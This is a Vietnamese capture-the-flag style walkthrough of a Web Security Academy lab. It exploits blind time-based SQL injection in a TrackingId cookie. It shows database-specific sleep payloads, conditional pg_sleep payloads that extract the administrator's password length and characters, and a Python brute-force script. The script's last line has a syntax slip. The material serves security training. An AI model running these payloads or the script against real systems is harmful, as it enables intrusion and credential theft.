![image](https://github.com/user-attachments/assets/192f7bac-eac7-4c1e-8f77-81188053a8b3)![image](https://github.com/user-attachments/assets/8ada8e2a-1f15-4ea8-bc10-a9b62db91e33)

```
Oracle: dbms_pipe.receive_message(('a'),10)
Microsoft: WAITFOR DELAY '0:0:10'
PostgreSQL: SELECT pg_sleep(10)
MySQL: SELECT sleep(10)
```

Tiếp tục test nhé, test xem dbms của nó là gì?

**Cách 1:**

![image](https://github.com/user-attachments/assets/1b2f3730-5ffd-4b8f-b1a1-b08b5e568d59)

**Cách 2:**

![image](https://github.com/user-attachments/assets/f3c91669-cb17-499b-9157-0d4aac62a7c2)

![image](https://github.com/user-attachments/assets/a910870d-03d0-46d4-9e52-e0fdb53d9eed)

```
'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
'%3BSELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

Vậy là dbms là PostgreSQL và nó đã bị time based
 
![image](https://github.com/user-attachments/assets/065c8d19-1012-4de2-9064-b554541705e0)

Vì đề đã cho biết username là administrator rồi nên ta test thôi, thì time based nó đã hoạt động.

```
'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

![image](https://github.com/user-attachments/assets/c00b0afb-9c77-4836-b450-3c96b633cfb5)

```
'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>19) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Đó sau khi ta chạy lệnh đó thì ta xác định được độ dài passwd là 20.

Thì đến bước này cũng như các challenge trước thôi. Cũng sẽ bruteforce passwd, nhưng khác cái là lần này dựa trên time-based.

**Cách 1:**

![image](https://github.com/user-attachments/assets/e8274ad0-6fd1-4746-b624-a0c76879c2f2)

```
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='2')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Ta có thể thấy được rằng kí tự đầu tiên của passwd sẽ là số 2.

Đó, cứ tiếp tục bruteforce bằng intruder như này thì sẽ ra thôi

Tiếp theo là đến **cách 2**, 

![image](https://github.com/user-attachments/assets/ab63fc53-e837-4f91-b2c4-eaa4f320451d)

Đây là script:

```
import requests
import string
import time

# Cấu hình request
URL = "https://0ac400e504906846808f3dd500ca0043.web-security-academy.net/filter?category=Lifestyle"
COOKIES = {
    "session": "LORcKFb3Coo5FIWQKG47LRWaTpcEPBRb"
}
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36",
    "Referer": "https://0ac400e504906846808f3dd500ca0043.web-security-academy.net/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": '"Chromium";v="125", "Not.A/Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document"
}

# Bộ ký tự cần thử: a-z, A-Z, 0-9
CHARSET = string.ascii_letters + string.digits
SLEEP_TIME = 5  # Số giây sleep nếu đúng ký tự
TIMEOUT_THRESHOLD = 4  # Nếu request lâu hơn 4s, có thể là ký tự đúng

def is_correct_guess(start_time):
    """ Kiểm tra nếu response time lớn hơn TIMEOUT_THRESHOLD. """
    return (time.time() - start_time) > TIMEOUT_THRESHOLD

def brute_force_password():
    password = ""
    
    for i in range(1, 50):  # Giả sử password có tối đa 50 ký tự
        found = False
        for char in CHARSET:
            # Inject SQL để kiểm tra ký tự thứ i của password
            payload = f"9FlQf69oKAk7n37p'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{char}') THEN pg_sleep({SLEEP_TIME}) ELSE pg_sleep(0) END FROM users--"
            cookies = COOKIES.copy()
            cookies["TrackingId"] = payload
            
            print(f"[*] Đang thử ký tự thứ {i}: {char}")  # Debug
            start_time = time.time()
            response = requests.get(URL, cookies=cookies, headers=HEADERS, timeout=10)
            
            if is_correct_guess(start_time):
                password += char
                print(f"[+] Ký tự đúng: {char} --> {password}")
                found = True
                break
        
        if not found:
            print(f"[*] Kết thúc, password có thể là: {password}")
            return password
    
    return password

# Chạy script
final_password = brute_force_password()
print(Password cuối cùng: {final_password}")
```

![image](https://github.com/user-attachments/assets/79ed77a3-2d48-4e68-8ba2-88313223b90c)

![image](https://github.com/user-attachments/assets/d6bec758-0fbf-4723-9ab3-fab87b7ddc42)

Vậy là đã thành công rồi đấy
